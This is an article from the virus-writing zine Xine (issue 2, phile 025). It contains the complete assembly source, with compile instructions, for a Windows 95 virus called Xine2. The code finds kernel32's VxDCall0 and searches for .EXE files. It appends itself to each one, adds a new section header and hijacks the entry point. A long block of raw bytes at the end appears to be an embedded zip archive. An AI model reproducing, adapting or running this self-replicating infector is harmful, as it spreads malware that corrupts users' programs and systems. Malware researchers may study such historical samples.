
   ;                                        /-----------------------------\
   ;                                        | Xine - issue #2 - Phile 025 |
   ;                                        \-----------------------------/


   ; This virus was designed for Xine2 the second zine release for iKx
   ; sadly Xine2 may never be released.  Another group dies with the first
   ; zine it releases <sigh>
   ; Thanks to Murkry for some of the ideas
   ; like using the unused data area in the data segment
   ; and other invaluable ideas ;)
   ;cheers,
   ; jhb
   ;
   ; Compiling:
   ;
   ;tasm32 /ml /m3 Xine2,,;
   ;tlink32 /Tpe /aa /c  Xine2,Xine2,, import32.lib
   ;
   ; Two assumations are made that will keep this virus within the win95
   ; realm
   ;       1 Check for 400000h as the bas loading address
   ;       2 Check that some system dll is loaded at BFF70000H
   ;          we hope its kernel32
   ;
   ;       The virus will attempt to return to the host if either is
   ;       not true
   ;
   ;
   ;ok the object is to design this virus in chunks
   ;
   ; 1.
   ;        Find a Quick way to locate the VxdCall 0 in the smallest possible
   ;        way.
   ;          Check if the list is in order then just goto or scan for
   ;          the exports that have the firts 5 or so pointers into the
   ;          same region ??? start at bff70000 area then scan upward
   ;          Well this does not work, too many repeating bytes in the
   ;           area but still using the Bff70000h start point its easy to
   ;          find the Address table of the Exports which as it is in ordinal
   ;          order we know the first one is (you guess it) VxDCall0 ;)
   ;
   ;       2 Next since we can be pretty sure this is win95
   ;          we scan from 400000h for the PE marker
   ;          then locate the data size and where it should be
   ;          since win95 use the 4096 as a page size the data
   ;          segment will be in increments of 4096 (1000h)
   ;          then check how big an area the host program actual uses
   ;          if it has at least 600h  bytes unused we then
   ;          return with pointer to this area for virii to use as
   ;          as a data R/W area.
   ;         Well this works as long as there is only one data area
   ;         if there is more then one then the calculations mess up
   ;         so to remedy this one must search the Section headers for
   ;         A R/W data area that has a dead space of 600
   ;         this is a little harder to do but should better assure us of
   ;         a location that has free space
   ;         Basic structure of the GetDataSpace
   ;         1 find the section entries
   ;         2 check flags for r/w
   ;           test  [header + 24h],0C0000000h      ;flags = 0ffset 24h
   ;           jz    NotRW
   ;       ;good one check it
   ;       ;if if it as a big enough area for us
   ;           mov   eax,[header + 8h]
   ;           sub   eax,[header + 14h]
   ;           cmp   eax,600h
   ;           jge   SpaceOk
   ;           jmp   NotRW
   ;           add   eax,[header + 0ch]
   ;           add   eax,400000h
   ;

   ;typedef struct _WIN32_FIND_DATA {
   ;   DWORD dwFileAttributes;                          0
   ;   FILETIME ftCreationTime;            DD ?,?       4
   ;   FILETIME ftLastAccessTime;          DD ?,?       C
   ;   FILETIME ftLastWriteTime;           DD ?,?       14
   ;   DWORD nFileSizeHigh;                             1C
   ;   DWORD nFileSizeLow;                              20
   ;   DWORD dwReserved0;                               24
   ;   DWORD dwReserved1;                               28
   ;   CHAR cFileName[MAX_PATH];                        2C
   ;   CHAR cAlternateFileName[ 0EH ];                  12bh
   ;} WIN32_FIND_DATA                                   139h


   .386
   locals
   jumps
   .model flat ,stdcall
   ;Define the needed external functions and constants here.

   extrn           ExitProcess:PROC
   extrn           MessageBoxA:PROC                ;note in the user32.dll

   ;----------------------------------------
   K32             equ     0BFF70000H         ;LOCATION OF THE KERNEL32
                                              ;MODULE FOR WIN95
   Viruslen        equ     (EndViri - offset HOST  )

   ;BELOW IS THE DATA AREA EQU FOR THE VIRUS
   ;ESI SHOULD POINT TO A  START OF A MIN OF 400K R/W DATA AREA (I HOPE :> )
   ; (Murk- If your wrong I am wasting my time!!! )

   OrginIP         equ      00h
   VxDCall         equ      04h
   Counter         equ      08h
   SrchHdle        equ      0Ch
   FleHdle         equ      010h
   Vsize           equ      014h            ;holds the VirtualSize of the virus
   PElocation      equ      018h
   LocOfOldIP      equ      01Ch           ;where we will place the old ip
   OldIP           equ      020h           ;Area to hold it b4 we write it
   NewIP           equ      024h
   SRCH            EQU     0C0H            ;length 139h I think ;)

   BUFFER          equ     200H            ;buffer  for read write area

   ;---------------------------------------------------------------------


   .data                                        ;the data area
   storage         dd      4 dup(0)

   .code                                   ;executable code starts here

   HOST:

   ;first we check if this is a version of win95 that the virus's knows
   ; not a surefire test but if
   ; 1: EAX is = EIP on startup on start if this is true
   ;       then eax  upper word will in most cases be 0040 unless the first
   ;       segemets take up more then (4095D * 255D) (1000*ff) which is
   ;       unlikely at least now if it is we simply let the host take over.
   ;
   ; 2: Next we check within 200H bytes if there is a 'PE',00h
   ;       once we find this we can find the data area and go from there
   ;       again if we cant let the host take over
   ;
   ; 3: Lastly is there 2k free in the data segment to use if not
   ;       let the host take over we might want to check the host
   ;       before we infect it to avoid this chance.

   HOST:
           pushad
           push   eax              ;the IP of the virus
   ;here we are modifigng the store EAX in the stack so we can
   ;use it as a jump to return the host later
   ;warning this will crash horrible in a non Win95 setup

           mov     edx,offset oldip - offset HOST
           add     edx,eax                      ;
           mov     eax,[edx]
           add     eax,0400000h
           mov     [esp + 20h],eax         ;fix the eax be 4 so we can return
                                           ; to the host


           CALL   GetDataSpace

           OR     ESI,ESI          ;check if we found enough memory
           JZ     NotWinPopx       ;for us to play with

           pop     dword ptr [esi + OrginIP]        ;store the start point
                                                   ;here

           CAll   GET_VXD

           OR     ESI,ESI          ;check if we found enough memory
           JnZ    Win95            ;for us to play with

           ;ok we now have the address to the VxDcall
           ;so we can use the protected mode int21
           ;also we know this is a version of win95 that I
           ; 1 Loads the modules in at 400000h
           ; 2 Some dll is loaded at bff7000h we hope its Kernel32
           ;We otherwise would have failed in our tests or would have already
           ;caused some sorta Exception error

   NotWinPopx:
            pop     eax
   NotWin95:

            jmp     fini


   ;-----------------------------------------------------------------
   Win95:

           mov     dword ptr ds:[ebp + Counter],0    ;INIT A COUNTER


           call    FindFile
           mov     [ebp + SrchHdle],ebx

           jnc     FoundOne        ;need find next routine
                                   ;ebx has the search file handle for next
                                   ;routine


   TryAgain:
           cmp     dword ptr [ebp + Counter],4     ;have we search for max
           je      NoFile                          ;yep get out

           call    FindNext        ;try to find another
           OR      EAX,EAX         ;
           JZ      NoFile          ;there is no other




   FoundOne:

           inc     dword ptr [ebp + Counter]       ;inc the counter

           CALL    OpenFile                        ;try to open the file
           JC      NOT_OPEN                        ;not opened
           jMP     FileOpen                        ;open

   NOT_OPEN:
           cmp     dword ptr [ebp + Counter],4     ;have we search for max
           je      NoFile                          ;yep get out

           mov     ebx,[ebp + SrchHdle]            ;get the search handle
           jmp     TryAgain                        ;try again




   FileOpen:
           MOV     [ebp + FleHdle],EBX             ;get the file handle

           MOV     ECX,400H                        ;readin the
           CALL    ReadFile                        ;header

           ;if we found a file we can read the file into the BUFFER location
           ;say 1k worth check if infect setup the new entry and
           ;if all it ok then we can write the virus to the end
           ;and then write the modified version to disk

           ;Find the PEheader start
           ;if not PE the get out
           MOV     EAX,BUFFER + 3CH        ;OFFSET TO THE HEADER
           ADD     EAX,EBP

           mov     ESI,dword ptr [EAX]     ;

           ADD     ESI,BUFFER
           CMP     DWORD PTR [ESI+EBP],00004550H   ;Check for PE00
           je      OkFile                          ;yay its one

   FileOpenError:
           call    Close
           jmp     TryAgain


   OkFile:
           ;ESI + EBP = THE LOCATION OF THE PE HEADER
           ;SO
           ADD     ESI,EBP                 ;esi = PE header location

           push    esi                     ;make sure its not infected

           mov     eax,"niX."              ;yet
           mov     ecx,200h                ;
           repne   scasd                   ;

           pop     esi

           je      FileOpenError           ; its infected

   ;ok we know the file is a PE and its not infected with Xine2
   ;
           mov     bl,02                   ;get end of to file
           call    MovePoint               ;

           mov     eax,dword ptr [esi + 28h]       ;save the old ip
           mov     dword ptr [ebp + OldIP],eax     ;

           mov     eax, Viruslen - 1
           mov     ecx, [esi + 3ch]        ;file align is 3ch
           add     eax,ecx                 ;
           xor     edx,edx
           div     ecx
           mul     ecx

           push    eax                     ;this is how much we are
                                           ;writing with the buffer
                                           ;


           pop     ecx
           mov     dword ptr[ebp + Vsize],ecx

           mov     ecx, Viruslen
   ; ebx - handle
   ; ecx - number of bytes
   ; edx - the location of what we want to write


           mov     edx,dword ptr [ebp + OrginIP]   ;get the file handle
           call    WriteFile                       ;write this to the end


           mov     ecx,8                           ;we want to write the
           mov     edx,ebp                         ;old ip at the end of the
           add     edx,OldIP                       ;virus
           call    WriteFile                       ;

           mov     edx,400400h
           mov     ecx,dword ptr[ebp + Vsize]
           sub     ecx,Viruslen + 8
           call    WriteFile



   ;ok if all is ok we need to add our section header
   ;and then update the rva starting point


           inc     word ptr [esi + 6]              ;section count 06
                                                   ;incrment it for us
           xor     eax,eax
           mov     ax,[esi + 6]

           mov     [ebp + PElocation], esi   ; save the pointer to the PE header

           dec     eax
           mov     ecx,28h                 ;section header size
           mul     ecx

           add     esi,eax                 ;location in header where we
           add     esi,0f8h                ;need to load the new section
                                           ;header
                                           ;f8 is the size of the pe header

           mov     edi,esi                 ;edi = location in buffer
                                           ;toplace new header

           sub     esi,28h                 ;pointer to
                                           ; the last old section header

   ;-------------------
   ;name of the section   header
   ;-------------------

           mov     eax,"niX."              ;this stores the new header
           stosd                           ;name for us
           mov     eax,"2e"                ;
           stosd                           ;       8 bytes

   ;-------------------
   ;virtual size    what did we write to the file with buffer
   ;-------------------

           mov     eax,dword ptr[ebp + Vsize]      ;sets the virtual
           stosd                                   ;size of the header
                                                   ;0ch
   ;-------------------
   ;Virtual address
   ;-------------------

           mov     eax,[esi + 10h]          ;get size of raw data from previous
           dec     eax                      ; - 1

           mov     ebx,[ebp + PElocation]  ;get  the pointer to the PE header

           mov     ecx,[ebx + 38h]         ;get the section alignmnet
           add     eax,ecx
           xor     edx,edx
           div     ecx
           mul     ecx                     ;eax = the size of the last section
                                           ;Section aligmnet blocks

           add     eax,[esi + 0ch]         ;add in the Vaddress of the last
                                           ; section

           stosd                           ; 010h

           mov     dword ptr [ebx + 28h],eax ;update the PEheader entry point

           add     eax,dword ptr [ebx + 38h] ;update the size of the image file
           mov     dword ptr [ebx + 50h],eax ;virii should not be bigger than
                                             ;4096 or this will not work

   ;-------------------
   ;size of raw data
   ;-------------------
           mov     eax,[ebp + Vsize]       ;the size of the raw data
           stosd                           ; 14h

           add     dword ptr [ebx + 1ch],eax       ;update
                                                   ;size of code in pe header
   ;-------------------
   ;pointer to raw data
   ;-------------------
           mov     eax,[ebp + SRCH + 20h]  ; old size of file
                                           ;from the find data struc

           stosd                           ; 18 h bytes

   ;-------------------
   ;ptr to relocs  size 4
   ;-------------------
           push    LARGE 0
           pop     eax
           stosd
   ;-------------------
   ;ptr to line nums size 4
   ;-------------------
           stosd
   ;-------------------
   ;num relocs     size 2
   ;-------------------
           stosw

   ;-------------------
   ;num line no     size 2
   ;-------------------
           stosw
   ;-------------------
   ;Chararteristcs size 4
   ; 6000 0020 excutable and readable code
   ;-------------------
           mov     eax,60000020h
           stosd




   ;
   ;ok write the firts 400h bytes back to the start of the file

           xor     bl,bl
           call    MovePoint

           mov     ecx,0400h
           mov     edx, ebp
           add     edx,BUFFER
           call    WriteFile

   FileInfected:
   EFileOpen:
           ;file error
           ;need to close file and leave
           call    Close


   NoFile:
   fini:

           popad
           jmp     eax


   ;====================================================================





   ;--------------------------------------------------------------
   ;all below are the int 21 calls the code uses or code that would
   ;be used in a virus using this  method
   ;-------------------------------------------------------------
   ;int 21 714eh
   ;cl = attributes mask
   ;ch = required mask
   ;si = time date format 0000h = 64 bit 0001h = msdos date time
   ;ds:dx = the file name we are looking for
   ;es:di = the place we want to fill with the found file
   ;done
   ;ax = file handle
   ;cx = uncode flag
   ;cf  set on error
   ;ax= error code

   ;FILE    equ     00400300h
   FNAME   EQU     02CH
   SecHeader       db      'Xine',0,0,0,0          ;8 byte header name
   HeaderFlags     dd      60000000h               ;Readable and Executable

   Fexe    db      '*.EXE',0

   FindFile:
           mov     eax,0000714eh

           mov     edx,offset Fexe - offset HOST   ;this will get us the *.exe
           add     edx,[ebp + OrginIP]     ;

           xor     esi,esi
           inc     esi
           push    ds
           pop     es
           mov     Edi, ebp           ;AREA TO SAVE THE FINDFILE INFO
           add     edi, SRCH          ;
           xor     ecx,ecx
           Call    INT_21
           mov     ebx,eax
           ret

   ;-------------------------------------------------------------
   ;ax = 714Fh
   ;ebx = file handle from previous search
   ;si = date time requested
   ;es:di  buffer for findata
   ;note ebx = the search handle

   FindNext:
           mov     ebx,[ebp + SrchHdle]
           mov     eax,0000714fh
           mov     esi,1

           mov     Edi, ebp
           add     edi, SRCH

           call    INT_21
           ret
   ;-------------------------------------------------------------
   ;
   ; ebx = the file handle we want to close
   Close:
           mov     eax,00003E00h
           MOV     ebx, dword ptr [ebp + FleHdle]          ;get the file handle
           call    INT_21
           ret


   ;-------------------------------------------------------------
   ; ecx:edx = the offset into the file
   ; al    0 = start of file
   ;       1 = current file
   ;       2 = end of file
   MovePoint:


           xor     ecx,ecx
           mov     edx,ecx

   MoveP:
           mov     eax,00004200h
           mov     al,bl
           MOV     ebx, dword ptr [ebp + FleHdle]          ;get the file handle
           call    INT_21
           ret

   ;-------------------------------------------------------------
   ;usual dos function here just need the filename from the search routine
   ;check cf for error
   OpenFile:
           mov     eax,00003d02h
           mov     EdX, ebp
           ADD     Edx,SRCH + FNAME
           xor     ecx,ecx
           call    INT_21
           mov     EBX,eax
           ret

   ;-------------------------------------------------------------
   ;CreateFile:
   ;        call    c1
   ;c1:
   ;        pop     eax
   ;
   ;        xor     ecx,ecx
   ;
   ;        mov     edx,offset Fake - offset c1
   ;        add     eax,edx
   ;        xchg    eax,edx
     ;mov    ds
   ;        mov     eax,00003c00h
   ;        call    INT_21
   ;        mov     ebx,eax
   ;        ret
   ;Fake    db      'Murk$$',0
   ;
   ;
   ;-------------------------------------------------------------
   ; ebx - handle
   ; ecx - number of bytes
   ; edx - the location of what we want to write
   WriteFile:
           mov     eax,00004000h
           MOV     ebx, dword ptr [ebp + FleHdle]          ;get the file handle
           ;mov     cx,number of bytes
           ;mov     dx,the location of the data
           call    INT_21
           ret

   ;-------------------------------------------------------------
   ;ecx number of bytes
   ;edx = where we write the info to
   ReadFile:

           MOV     EBX, [EBP+ FleHdle]
           mov     eax, 00003f00h
           ;mov     ecx,2
           mov     Edx,EBP
           ADD     EDX,BUFFER

           call    INT_21
           ret

   ;-------------------------------------------------------------
   INT_21:
           push    ecx
           push    eax
           push    002a0010h

           call    dword ptr [ebp + VxDCall]
           RET

   ;vxd0            dd      0bff713d4h    ;this is the addresss for the
                                          ;vxdcall0
   ;get_21          dd      002a0010h     ;this is the 2a = Vwin32 10 = the int21
                                          ;routine

   ;------------------------------------------------------------------------------------
   ; onreturn will have
   ; ESI = the start of a 4k area of r\w data that the virus can use
   ; eax = the data location to use

   GetDataSpace:

           mov     eax,00004550H       ;check for PE00
           mov     edi, 00400000h
           repne   scasd               ;
           jne     NotWin95A

           xchg    edi,esi

           lodsw                           ; ok we are at header + 4
                                           ; now we are at 6
           lodsw                           ; ax = the number of sections
                                           ;peheader + 8

           xor     ecx,ecx                 ;get the number of sections
           mov     ecx,eax                 ;

           add     esi,0f8h - 8            ;get to the section header
                                           ;

           ;esi points to the first section header

   TryNext:
           cmp     ecx,0
           jz      NotWin95A

           mov     eax,[esi + 24h]         ;flags
           and     eax,0c0000000h
           cmp     eax,0c0000000h
           jne      NextOne

           mov     eax,[esi + 8h]          ;virtual size
           xor     edx,edx

           mov     ebx,4095
           add     eax,ebx
           inc     ebx
           div     ebx
           mul     ebx

           sub     eax,[esi + 10h]         ;size of raw data
           cmp     eax,600h
           jge     OkSpace


   NextOne:
           add     esi,28h
           loop    TryNext

   OkSpace:
           mov     eax,[esi + 0ch]         ;virtual address
           add     eax,[esi + 10h]         ;size of raw data
           add     eax,00400000h
           push    eax
           pop     esi
           ret

   NotWin95A:
           xor     esi,esi
           ret


    ;end of GetDataSpace
   ;-----------------------------------------------------------
   ;-----------------------------------------------------------
   ;returns with the VxDcall fill with the correct location
   ;or again esi = 0 if failed
   ;
   GET_VXD:

           PUSH    ESI             ;SAVE OUR DATA AREA
           pop     ebp

           XOR     EAX,EAX
           MOV     ESI,K32 + 3CH
           LODSW

         ;ESI = THE PE HEADER START of the Kernel32

           ADD     EAX,K32
           CMP     DWORD PTR [EAX],00004550H       ;check for PE00
           JE      NoERROR

   ERROR:  JMP    NotWin95A

   ;ESI SHOULD HOLD THE POINTER TO THE
   ;RVA TO THE EXPORT DIRECTORY

   NoERROR:
           MOV     ESI,[EAX + 78H]         ; 78H = THE EXPORT RVA
           ADD     ESI,K32 + 1CH           ; 1CH RVA TO THE ADDRESS TABLE


           LODSD                           ; EAX IS
           ADD     EAX,K32                 ; FIRST OF THE ORDINAL
                                           ; EXPORTS

           PUSH    EAX                     ;get this in the esi
           POP     ESI                     ;

           LODSD                           ;gets the rva to the call
           ADD     EAX,K32                 ;EAX = THE VXDCALL IMPORT

           mov     [ebp +VxDCall],eax      ;save it in our data area

           RET
   ;end GetVxd
   ;-----------------------------------------------------------
           DB   80,75,3,4,20,0,0,0,8,0,242,170,119,32,167,184,152,155,109,25,0
           DB   0,63,90,0,0,7,0,0,0,65,68,68,46,65,83,77,205,60,107,115,219,56
           DB   146,223,93,229,255,208,179,181,85,147,76,148,172,36,59,153,140
           DB   85,185,41,197,166,199,218,113,44,173,164,36,190,155,115,165,32
           DB   18,146,24,83,132,150,15,75,158,171,251,239,135,110,0,36,64,82,178
           DB   125,201,94,157,146,74,36,18,104,52,26,221,141,126,1,61,152,110
           DB   4,176,52,205,87,44,11,69,156,2,75,56,172,88,192,33,91,178,12,54
           DB   97,20,193,45,231,107,249,51,76,225,46,76,242,84,62,148,63,98,249
           DB   132,203,175,241,47,175,15,15,122,144,112,22,173,240,139,250,116
           DB   224,116,201,253,91,152,139,4,142,219,248,89,202,81,168,203,76,254
           DB   31,9,22,132,241,2,88,16,36,60,77,203,126,93,221,143,6,79,197,138
           DB   67,122,159,102,124,5,129,196,35,84,29,121,0,242,229,251,243,243
           DB   159,17,238,69,217,89,126,54,28,150,98,205,33,204,82,137,118,18
           DB   243,232,168,11,246,71,182,46,59,76,37,58,102,74,18,62,203,228,72
           DB   235,12,50,33,167,147,229,73,140,223,16,229,165,72,51,8,231,192
           DB   229,196,121,34,241,40,65,196,66,182,79,114,174,224,202,191,226
           DB   150,186,136,217,87,238,103,136,178,132,17,240,52,92,196,54,9,195
           DB   24,252,101,30,223,166,26,159,206,43,107,26,231,97,44,167,8,255
           DB   200,67,255,22,54,236,30,65,68,194,103,25,39,208,159,182,193,41
           DB   147,232,182,65,47,66,186,146,63,185,68,113,45,210,52,156,69,220
           DB   130,37,187,219,160,65,211,87,78,6,123,70,97,74,56,74,64,34,9,228
           DB   212,228,195,24,190,230,242,233,66,200,81,69,2,169,207,98,92,70
           DB   7,8,246,229,219,181,72,178,84,45,213,146,221,41,228,230,33,62,123
           DB   77,61,133,68,40,140,51,158,224,0,138,148,14,148,148,173,56,36,124
           DB   17,138,24,126,253,245,87,72,51,150,100,184,182,179,249,156,214
           DB   22,153,145,41,156,8,141,124,189,97,73,224,192,248,204,163,72,17
           DB   54,16,60,165,229,216,136,228,182,5,153,16,176,98,241,189,28,96
           DB   205,89,134,220,54,187,207,120,170,137,230,0,81,227,204,242,76,162
           DB   128,140,144,167,216,28,167,243,94,99,178,212,200,209,132,136,187
           DB   56,75,113,97,28,56,115,92,56,236,214,87,124,13,25,155,69,28,132
           DB   34,182,167,9,182,89,134,62,73,67,104,209,62,140,89,228,192,82,235
           DB   177,225,112,27,139,141,33,109,154,129,136,57,246,122,118,47,114
           DB   88,228,56,72,152,61,135,79,219,51,228,137,54,244,158,59,28,222
           DB   133,43,190,149,211,10,99,159,35,48,164,226,140,195,58,225,89,118
           DB   15,105,158,112,69,188,48,45,69,217,22,38,181,250,137,88,21,82,140
           DB   18,141,216,140,60,88,177,228,150,215,24,35,182,121,53,96,25,147
           DB   163,255,201,129,197,129,156,57,79,80,54,33,93,138,60,10,36,38,46
           DB   63,40,44,17,15,200,83,5,224,184,253,203,27,164,21,131,53,91,112
           DB   5,202,0,118,59,243,197,138,199,90,99,201,41,134,177,252,235,39
           DB   28,31,166,184,4,4,233,89,7,39,241,188,142,179,79,98,177,20,27,152
           DB   133,11,137,108,193,122,74,248,215,137,88,36,108,5,204,207,114,134
           DB   12,194,45,29,32,63,225,28,167,181,68,68,51,136,56,147,93,222,32
           DB   181,52,207,229,177,236,17,32,65,113,48,167,167,214,52,168,83,141
           DB   184,40,181,19,166,10,7,36,248,93,152,132,33,62,70,178,48,119,104
           DB   34,14,209,121,252,183,207,212,197,17,248,82,64,80,46,82,32,237
           DB   139,170,151,180,113,66,204,36,226,232,158,24,139,192,32,8,27,130
           DB   210,21,170,229,74,36,106,14,212,156,190,32,141,124,22,249,121,164
           DB   119,144,21,50,101,190,182,65,164,66,41,213,21,15,238,21,50,216
           DB   125,133,122,38,229,44,241,151,4,101,194,125,132,0,75,206,2,84,26
           DB   21,173,211,167,9,22,40,26,197,67,211,151,61,32,93,51,159,132,237
           DB   77,187,109,247,51,12,206,32,10,179,44,226,178,143,210,117,2,2,161
           DB   164,222,176,99,134,212,199,221,80,206,50,71,174,177,225,48,197
           DB   216,136,97,49,244,60,225,92,13,108,183,124,207,210,208,135,52,75
           DB   114,63,67,80,90,1,252,198,179,51,137,253,164,218,188,83,42,142
           DB   84,147,128,199,89,18,186,60,214,213,60,58,143,216,130,104,3,201
           DB   223,54,174,26,203,112,19,128,63,20,253,224,5,116,143,151,55,173
           DB   246,105,187,173,101,151,62,61,5,224,29,180,231,243,148,103,216
           DB   200,133,242,245,79,252,247,74,100,227,207,229,139,222,66,136,128
           DB   86,77,97,17,102,214,59,228,126,18,0,90,12,20,32,30,139,124,177
           DB   44,25,56,119,121,22,86,226,78,254,203,217,182,85,98,251,118,121
           DB   3,110,171,52,159,213,90,117,228,156,220,86,254,106,173,91,161,200
           DB   85,230,178,224,242,95,162,248,240,182,242,138,186,85,166,73,235
           DB   28,4,181,81,219,126,117,212,178,149,214,140,164,119,229,63,217
           DB   253,154,7,124,174,151,31,190,124,30,92,29,117,191,156,15,174,206
           DB   190,156,245,167,125,248,47,5,231,236,243,112,124,6,193,230,60,140
           DB   120,63,203,146,112,150,103,60,181,71,168,124,52,79,159,15,46,189
           DB   233,224,131,7,243,236,52,225,196,142,211,112,197,157,142,103,103
           DB   240,107,235,87,253,227,184,214,239,146,165,89,223,247,121,154,86
           DB   122,58,253,78,27,251,125,78,194,140,87,7,116,250,117,142,237,9
           DB   198,56,191,73,248,39,191,8,23,203,61,179,195,142,167,141,29,47
           DB   197,102,127,63,232,182,93,146,142,121,202,147,59,30,180,31,232
           DB   7,93,7,213,178,99,231,193,142,111,85,199,211,139,254,24,124,196
           DB   244,138,173,248,31,31,250,215,95,70,253,233,197,205,206,254,221
           DB   83,187,99,63,202,120,18,179,140,23,16,160,237,93,64,83,247,78,119
           DB   134,28,246,223,80,101,167,135,63,157,163,95,150,200,153,135,7,175
           DB   142,222,190,57,60,64,45,22,165,135,7,95,243,213,90,254,247,106
           DB   37,2,30,161,90,201,160,149,102,129,124,137,150,200,25,159,135,74
           DB   197,67,204,57,26,221,124,75,216,202,166,121,236,107,103,33,14,192
           DB   151,95,50,134,155,44,110,18,175,112,28,217,50,137,45,12,188,109
           DB   152,141,18,129,28,119,50,26,15,79,235,45,62,200,87,108,193,223
           DB   139,109,159,90,84,231,208,139,69,198,141,189,155,167,60,57,234
           DB   190,10,16,79,212,24,47,31,249,57,60,248,189,226,13,240,127,230
           DB   74,182,10,111,162,28,241,114,120,218,159,14,134,87,48,60,135,233
           DB   133,7,191,123,227,43,239,242,168,43,199,124,252,167,247,97,120
           DB   246,241,210,131,243,225,24,87,14,13,172,79,232,0,68,60,174,226
           DB   240,204,139,3,249,46,132,151,32,148,102,190,24,78,166,0,207,129
           DB   212,202,123,239,114,248,25,6,19,194,133,86,190,63,246,250,224,253
           DB   227,35,1,199,167,159,6,227,143,19,217,212,155,12,96,114,49,252
           DB   120,121,6,163,225,224,106,10,211,33,244,1,38,211,254,120,138,179
           DB   233,195,135,1,77,235,184,221,254,157,54,213,18,222,179,129,28,118
           DB   228,193,201,191,1,89,73,207,62,228,201,237,75,24,204,225,94,228
           DB   9,108,18,180,29,6,192,86,176,97,41,89,213,171,123,200,194,21,255
           DB   225,135,31,176,199,225,193,48,89,132,241,96,84,163,49,144,142,212
           DB   134,106,195,91,220,134,78,69,78,6,80,253,237,91,249,118,146,248
           DB   203,139,32,226,245,183,167,242,237,121,196,237,151,214,219,14,13
           DB   76,166,99,125,233,229,235,227,165,245,28,122,75,17,5,202,85,253
           DB   20,38,104,238,161,22,50,123,56,185,111,135,7,35,175,176,5,170,208
           DB   16,211,75,225,15,231,195,40,48,100,176,94,159,218,131,245,148,69
           DB   188,225,202,108,93,71,104,193,144,251,24,5,16,174,15,15,44,24,21
           DB   64,221,182,3,168,79,22,145,128,37,245,204,96,118,76,80,81,91,227
           DB   207,195,131,43,190,217,5,201,157,127,237,115,120,48,25,159,94,216
           DB   79,144,233,20,221,45,129,65,44,34,30,47,178,37,105,28,24,160,225
           DB   21,223,146,71,114,120,240,254,227,249,185,55,174,15,223,181,101
           DB   14,65,204,242,249,28,57,128,12,28,52,235,212,28,148,81,250,4,97
           DB   127,64,19,144,80,189,34,99,242,145,159,94,225,207,40,92,210,76
           DB   36,108,81,178,20,217,3,184,223,66,144,175,159,181,159,187,36,148
           DB   131,249,34,176,25,112,231,56,124,203,253,92,121,142,212,133,60
           DB   79,165,93,17,14,106,133,19,34,133,114,8,55,133,73,54,183,76,221
           DB   59,158,164,200,157,98,174,29,42,50,89,11,14,254,49,37,191,146,172
           DB   50,244,153,25,249,130,18,32,87,70,36,90,197,33,89,191,157,19,240
           DB   250,215,8,244,29,120,131,17,72,152,132,80,190,46,190,218,35,235
           DB   88,136,237,90,113,182,5,200,215,107,116,103,69,18,40,86,15,99,88
           DB   161,99,229,179,148,167,232,175,181,219,199,109,200,227,136,220
           DB   102,227,237,150,144,82,190,224,43,142,225,6,118,203,37,52,203,19
           DB   121,118,220,254,229,245,25,252,4,221,215,175,207,158,43,23,239
           DB   167,249,252,185,118,180,237,104,141,132,31,222,242,232,190,244
           DB   210,208,185,86,182,43,122,72,232,96,174,214,242,125,196,179,210
           DB   249,163,33,197,29,79,94,105,223,186,123,162,220,234,130,244,58
           DB   34,70,204,172,163,12,150,211,196,224,199,145,247,99,203,49,78,133
           DB   118,200,181,229,175,6,39,103,219,184,2,165,163,131,187,236,66,40
           DB   55,60,83,108,96,192,176,5,67,71,119,174,123,103,59,16,215,120,31
           DB   157,0,218,112,114,126,161,241,254,186,183,202,135,209,91,171,242
           DB   215,181,43,173,253,77,9,29,89,196,13,162,233,111,205,195,33,54
           DB   171,112,177,204,96,195,20,28,95,71,245,84,203,178,255,140,207,133
           DB   82,128,97,60,167,128,25,53,103,119,34,212,100,241,151,44,246,149
           DB   89,161,57,223,96,177,206,211,37,11,220,223,202,36,111,16,92,228
           DB   92,71,131,247,140,230,165,128,167,8,194,121,184,208,65,31,148,108
           DB   174,184,94,7,216,50,38,177,79,133,166,178,236,76,116,209,254,14
           DB   218,81,118,204,208,144,35,98,25,81,126,195,146,88,197,147,66,29
           DB   104,244,19,38,81,93,138,36,193,104,29,142,194,32,22,49,124,38,73
           DB   77,37,156,53,206,215,117,150,228,204,130,109,75,155,6,34,10,194
           DB   181,107,41,148,237,153,86,69,216,190,70,141,130,42,13,240,209,229
           DB   145,157,110,26,64,201,87,237,194,209,169,118,252,131,167,107,116
           DB   55,219,203,27,103,192,222,60,220,170,88,161,124,56,227,112,92,210
           DB   80,83,235,241,198,84,207,14,198,218,212,169,237,86,69,164,179,127
           DB   121,41,255,115,189,238,242,245,80,237,70,222,100,208,66,131,169
           DB   28,168,208,166,40,158,34,143,3,227,205,174,248,74,36,247,214,8
           DB   127,255,15,208,174,242,231,48,30,137,245,182,152,55,185,188,136
           DB   241,58,98,247,164,30,236,161,215,98,173,182,12,210,135,235,44,65
           DB   10,134,240,2,180,237,116,83,224,162,88,81,243,160,137,63,62,201
           DB   2,213,54,141,222,60,74,218,144,13,246,155,55,253,242,233,250,204
           DB   2,248,125,233,19,19,129,20,91,219,232,60,64,31,12,162,75,224,168
           DB   155,139,192,50,51,33,85,161,131,224,103,202,81,41,73,85,176,150
           DB   137,29,174,19,145,113,63,227,1,202,55,138,89,214,237,88,29,88,164
           DB   186,232,0,235,254,157,115,96,117,132,14,92,10,166,109,68,9,58,143
           DB   84,88,89,54,171,137,72,15,186,48,193,60,70,45,129,161,131,220,75
           DB   39,103,241,187,206,89,88,0,62,115,16,168,171,55,161,156,214,134
           DB   2,85,68,148,57,11,35,9,9,195,199,121,66,187,118,138,81,119,171
           DB   5,139,208,128,186,183,96,249,140,226,144,42,177,34,146,140,129
           DB   183,245,249,90,133,156,146,4,227,109,135,7,37,59,91,202,182,224
           DB   89,206,182,166,201,47,175,79,28,65,84,17,21,10,131,135,202,225
           DB   252,118,107,237,240,192,12,100,241,149,209,59,165,252,4,233,201
           DB   31,124,134,74,72,187,16,55,173,54,205,120,112,53,152,66,31,78,135
           DB   31,175,166,222,216,97,244,242,135,175,61,18,76,188,160,43,222,164
           DB   225,8,184,241,64,110,90,124,182,181,33,124,141,125,149,186,65,121
           DB   24,198,188,244,91,57,15,212,158,30,163,197,144,136,60,11,99,107
           DB   128,221,86,224,108,75,17,70,21,21,164,24,233,60,164,224,101,140
           DB   94,14,74,16,66,124,4,164,250,152,136,249,52,185,239,163,241,112
           DB   242,80,127,139,76,171,186,218,114,105,126,172,181,13,114,223,166
           DB   196,91,226,186,66,182,41,168,165,233,115,37,144,218,187,135,238
           DB   221,243,53,44,112,187,203,179,135,214,141,12,178,98,199,79,40,105
           DB   70,116,103,49,137,79,77,177,225,6,223,194,77,190,97,71,212,138
